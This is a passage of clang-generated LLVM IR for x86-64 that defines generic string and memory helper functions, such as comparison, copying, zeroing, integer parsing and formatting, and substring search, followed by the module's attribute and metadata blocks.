; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @util_strcmp(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* noundef %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* noundef %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp ne i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %2
  store i8 0, i8* %3, align 1
  br label %34

16:                                               ; preds = %2
  br label %17

17:                                               ; preds = %32, %16
  %18 = load i32, i32* %6, align 4
  %19 = add nsw i32 %18, -1
  store i32 %19, i32* %6, align 4
  %20 = icmp ne i32 %18, 0
  br i1 %20, label %21, label %33

21:                                               ; preds = %17
  %22 = load i8*, i8** %4, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %4, align 8
  %24 = load i8, i8* %22, align 1
  %25 = sext i8 %24 to i32
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i32 1
  store i8* %27, i8** %5, align 8
  %28 = load i8, i8* %26, align 1
  %29 = sext i8 %28 to i32
  %30 = icmp ne i32 %25, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %21
  store i8 0, i8* %3, align 1
  br label %34

32:                                               ; preds = %21
  br label %17, !llvm.loop !31

33:                                               ; preds = %17
  store i8 1, i8* %3, align 1
  br label %34

34:                                               ; preds = %33, %31, %15
  %35 = load i8, i8* %3, align 1
  ret i8 %35
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strcpy(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* noundef %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* noundef %8, i8* noundef %9, i32 noundef %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !32

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_zero(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

7:                                                ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7, !llvm.loop !33

14:                                               ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !34

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isspace(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

10:                                               ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

18:                                               ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isdigit(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isalpha(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

10:                                               ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

18:                                               ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

20:                                               ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isupper(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @util_itoa(i32 noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp eq i8* %13, null
  br i1 %14, label %15, label %16

15:                                               ; preds = %3
  store i8* null, i8** %4, align 8
  br label %81

16:                                               ; preds = %3
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %74

19:                                               ; preds = %16
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 32, i32* %10, align 4
  %20 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %20, align 1
  %21 = load i32, i32* %6, align 4
  %22 = icmp eq i32 %21, 10
  br i1 %22, label %23, label %29

23:                                               ; preds = %19
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %23
  store i32 1, i32* %9, align 4
  %27 = load i32, i32* %5, align 4
  %28 = sub nsw i32 0, %27
  store i32 %28, i32* %12, align 4
  br label %31

29:                                               ; preds = %23, %19
  store i32 0, i32* %9, align 4
  %30 = load i32, i32* %5, align 4
  store i32 %30, i32* %12, align 4
  br label %31

31:                                               ; preds = %29, %26
  br label %32

32:                                               ; preds = %47, %31
  %33 = load i32, i32* %12, align 4
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %58

35:                                               ; preds = %32
  %36 = load i32, i32* %12, align 4
  %37 = load i32, i32* %6, align 4
  %38 = urem i32 %36, %37
  store i32 %38, i32* %11, align 4
  %39 = load i32, i32* %11, align 4
  %40 = icmp slt i32 %39, 10
  br i1 %40, label %41, label %44

41:                                               ; preds = %35
  %42 = load i32, i32* %11, align 4
  %43 = add nsw i32 %42, 48
  store i32 %43, i32* %11, align 4
  br label %47

44:                                               ; preds = %35
  %45 = load i32, i32* %11, align 4
  %46 = add nsw i32 %45, 55
  store i32 %46, i32* %11, align 4
  br label %47

47:                                               ; preds = %44, %41
  %48 = load i32, i32* %11, align 4
  %49 = trunc i32 %48 to i8
  %50 = load i32, i32* %10, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %51
  store i8 %49, i8* %52, align 1
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* %12, align 4
  %55 = udiv i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %10, align 4
  br label %32, !llvm.loop !35

58:                                               ; preds = %32
  %59 = load i32, i32* %9, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %65

61:                                               ; preds = %58
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %63
  store i8 45, i8* %64, align 1
  br label %68

65:                                               ; preds = %58
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %10, align 4
  br label %68

68:                                               ; preds = %65, %61
  %69 = load i8*, i8** %7, align 8
  %70 = load i32, i32* %10, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %71
  %73 = call i32 @util_strcpy(i8* noundef %69, i8* noundef %72)
  br label %79

74:                                               ; preds = %16
  %75 = load i8*, i8** %7, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 0
  store i8 48, i8* %76, align 1
  %77 = load i8*, i8** %7, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  store i8 0, i8* %78, align 1
  br label %79

79:                                               ; preds = %74, %68
  %80 = load i8*, i8** %7, align 8
  store i8* %80, i8** %4, align 8
  br label %81

81:                                               ; preds = %79, %15
  %82 = load i8*, i8** %4, align 8
  ret i8* %82
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_memsearch(i8* noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

16:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

17:                                               ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

21:                                               ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

35:                                               ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

43:                                               ; preds = %35
  br label %45

44:                                               ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

45:                                               ; preds = %44, %43
  br label %46

46:                                               ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17, !llvm.loop !36

49:                                               ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

50:                                               ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_stristr(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* noundef %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

16:                                               ; preds = %82, %3
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %83

20:                                               ; preds = %16
  %21 = load i8*, i8** %8, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %8, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %11, align 1
  %24 = load i8*, i8** %7, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  store i8 %28, i8* %12, align 1
  %29 = load i8, i8* %11, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sge i32 %30, 65
  br i1 %31, label %32, label %40

32:                                               ; preds = %20
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp sle i32 %34, 90
  br i1 %35, label %36, label %40

36:                                               ; preds = %32
  %37 = load i8, i8* %11, align 1
  %38 = sext i8 %37 to i32
  %39 = or i32 %38, 96
  br label %43

40:                                               ; preds = %32, %20
  %41 = load i8, i8* %11, align 1
  %42 = sext i8 %41 to i32
  br label %43

43:                                               ; preds = %40, %36
  %44 = phi i32 [ %39, %36 ], [ %42, %40 ]
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %11, align 1
  %46 = load i8, i8* %12, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp sge i32 %47, 65
  br i1 %48, label %49, label %57

49:                                               ; preds = %43
  %50 = load i8, i8* %12, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp sle i32 %51, 90
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i8, i8* %12, align 1
  %55 = sext i8 %54 to i32
  %56 = or i32 %55, 96
  br label %60

57:                                               ; preds = %49, %43
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  br label %60

60:                                               ; preds = %57, %53
  %61 = phi i32 [ %56, %53 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %12, align 1
  %63 = load i8, i8* %11, align 1
  %64 = sext i8 %63 to i32
  %65 = load i8, i8* %12, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %64, %66
  br i1 %67, label %68, label %81

68:                                               ; preds = %60
  %69 = load i32, i32* %10, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %10, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp eq i32 %70, %71
  br i1 %72, label %73, label %80

73:                                               ; preds = %68
  %74 = load i8*, i8** %8, align 8
  %75 = load i8*, i8** %5, align 8
  %76 = ptrtoint i8* %74 to i64
  %77 = ptrtoint i8* %75 to i64
  %78 = sub i64 %76, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %4, align 4
  br label %84

80:                                               ; preds = %68
  br label %82

81:                                               ; preds = %60
  store i32 0, i32* %10, align 4
  br label %82

82:                                               ; preds = %81, %80
  br label %16, !llvm.loop !37

83:                                               ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %84

84:                                               ; preds = %83, %73
  %85 = load i32, i32* %4, align 4
  ret i32 %85
}

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { argmemonly nofree nounwind willreturn writeonly }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone willreturn }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
